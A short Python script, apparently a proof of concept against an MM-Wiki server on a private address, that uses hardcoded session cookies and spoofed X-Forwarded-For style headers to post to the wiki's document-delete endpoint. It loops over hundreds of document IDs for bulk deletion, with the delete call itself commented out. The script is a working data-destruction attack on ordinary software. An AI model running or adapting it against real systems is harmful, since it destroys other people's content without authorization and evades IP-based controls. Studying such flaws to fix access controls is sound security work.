# -*- coding: utf-8 -*-
# 删除文章
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def document_delete(document_id):
    cookies = {
        'mmwikissid': '2fa2a4229f0dd9477aabbf3b3fc26684',
        'mmwikipassport': 'n8sckEYYgdC1i4aHiAiHgFQFy7hQydaGiF5ChwWcuwgZuwcQhdgHuEg=',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        # 'Cookie': 'mmwikissid=2fa2a4229f0dd9477aabbf3b3fc26684; mmwikipassport=n8sckEYYgdC1i4aHiAiHgFQFy7hQydaGiF5ChwWcuwgZuwcQhdgHuEg=',
        'Origin': 'http://192.168.232.154:8080',
        'Pragma': 'no-cache',
        'Referer': 'http://192.168.232.154:8080/document/index?document_id=2577',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'x-forwarded-for': '202.95.13.51',
        'x-originating-ip': '202.95.13.51',
        'x-remote-addr': '202.95.13.51',
        'x-remote-ip': '202.95.13.51',
    }

    params = {
        'document_id': document_id,
    }

    response = requests.post('http://192.168.232.154:8080/document/delete', params=params, cookies=cookies, headers=headers, verify=False)

if __name__== "__main__":

    print('''
 ____  _        ___  ____              
/ ___|/ | __ _ / _ \|  _ \  __ _ _   _ 
\___ \| |/ _` | | | | | | |/ _` | | | |
 ___) | | (_| | |_| | |_| | (_| | |_| |
|____/|_|\__, |\___/|____/ \__,_|\__, |
         |___/                   |___/ 
                                       
Powered by S1g0Day
    ''')
    for i in range(3451,4276):
        print(i)
        # document_delete(i)